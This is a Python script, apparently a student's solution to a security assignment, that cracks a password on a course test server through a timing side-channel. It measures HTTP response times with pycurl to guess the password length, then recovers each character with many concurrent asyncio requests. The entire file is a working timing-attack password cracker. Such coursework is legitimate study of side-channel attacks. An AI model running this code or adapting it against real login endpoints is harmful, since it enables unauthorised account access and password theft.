import urllib.parse
import time
from AsyncExp.Counter import Counter
from decimal import Decimal, getcontext
import pycurl
import io
import threading
import asyncio

_thread_local = threading.local()

### --- Global Variables --- ###

DIFFICULTY = 1

BASE_URL = "aoi-assignment1.oy.ne.ro"
SERVER_PORT = 8080

CHARSET = "abcdefghijklmnopqrstuvwxyz"

USERNAME = "326529229" # need to recieve

# since threads wait for a long long time for I/O
# it is possible and wanted to have a lot of threads
NUMBER_OF_THREADS = 100

PASSWORD = ""
LENGTH = -1

getcontext().prec = 30

### ------------------------- ###

def split_charset():
    """
    this function splits the charset to chars
    """
    parts = [c for c in CHARSET]
    return parts

### ------------------------- ###


def get_curl_instance():
    if not hasattr(_thread_local, 'curl'):
        _thread_local.curl = pycurl.Curl()
        # Ensure connection reuse is allowed (default is reuse; explicit for clarity)
        _thread_local.curl.setopt(pycurl.FORBID_REUSE, 0)
    return _thread_local.curl

def try_pass2(password):
    global USERNAME, DIFFICULTY, BASE_URL, SERVER_PORT
    params = {'user': USERNAME, 'password': password, 'difficulty': DIFFICULTY}
    query_string = urllib.parse.urlencode(params)
    url = f"http://{BASE_URL}:{SERVER_PORT}/?{query_string}"

    # Get persistent curl instance for this thread.
    c = get_curl_instance()
    buffer = io.BytesIO()
    c.setopt(c.URL, url)
    c.setopt(c.WRITEDATA, buffer)
    
    # Optionally adjust timeouts or other performance options here.
    c.perform()

    total_time_sec = c.getinfo(c.TOTAL_TIME)
    http_code = c.getinfo(c.RESPONSE_CODE)
    
    # Reset the curl object for reuse in future calls.
    c.reset()
    
    time_ns = Decimal(total_time_sec) * Decimal(1e9)
    data = int(buffer.getvalue().decode('utf-8')) == 1
    
    return {"Status": http_code, "Reason": "", "Time": time_ns, "Data": data}

### ------------------------- ###


def crack_password_length():
    # to warm up the connection
    try_pass2("!")
    maxTime = 0
    length=-1
    for l in range(33):
        result = try_pass2("a" * l)
        if(result.get("Time") > maxTime):
            maxTime = result.get("Time")
            length=l
    return length


### ------------------------- ###

def num_repetitions(discovered_length):
    """
    this function returns the number of repetitions needed for each char
    """
    global LENGTH
    # all times 1/internet speed slt
    return discovered_length*DIFFICULTY + DIFFICULTY*DIFFICULTY + 1


async def crack_next_char(discovered_length):
    global NUMBER_OF_THREADS
    # to warm up the connection
    try_pass2("!")
    r = 1 if LENGTH - discovered_length == 1 else num_repetitions(discovered_length)
    counter = Counter()
    parts = split_charset()
    tasks = []
    for round in range(r):
        for part in parts:
            tasks.append(asyncio.create_task(check_char(part, discovered_length, counter)))
    await asyncio.gather(*tasks)
    return counter.get_max_letter()
    


async def check_char(chars, discovered_length, counter):
    global PASSWORD, LENGTH
    # Get the current event loop
    loop = asyncio.get_running_loop()
    
    if LENGTH - discovered_length == 1:
        for char in chars:
            result = await loop.run_in_executor(None, try_pass2, PASSWORD + char + "a" * (LENGTH-discovered_length-1))
            if result.get("Data"):
                counter.record_time(char, result.get("Time"))
    else:
        for char in chars:
            result = await loop.run_in_executor(None, try_pass2, PASSWORD + char + "a" * (LENGTH-discovered_length-1))
            counter.record_time(char, result.get("Time"))


### ------------------------- ###

async def main():
    global PASSWORD, LENGTH
    start = time.perf_counter()
    print("Cracking the password...")
    print("-------------------")
    # first step - exploit the server's length validation
    LENGTH = crack_password_length()
    print(f"Password length: {LENGTH}")
    # second step - crack the password char by char
    discovered_length = 0
    while len(PASSWORD) < LENGTH:
        c = await crack_next_char(discovered_length)
        PASSWORD += c
        discovered_length += 1
        print(f"Password so far: {PASSWORD}")
    end = time.perf_counter()
    print("-------------------")
    print(try_pass2(PASSWORD))
    print(f"total time took: {(end-start)/60} minutes")
        
def test():
    print(try_pass2("usobopdjrcvbvmfz"))

if __name__ == '__main__':
    asyncio.run(main())
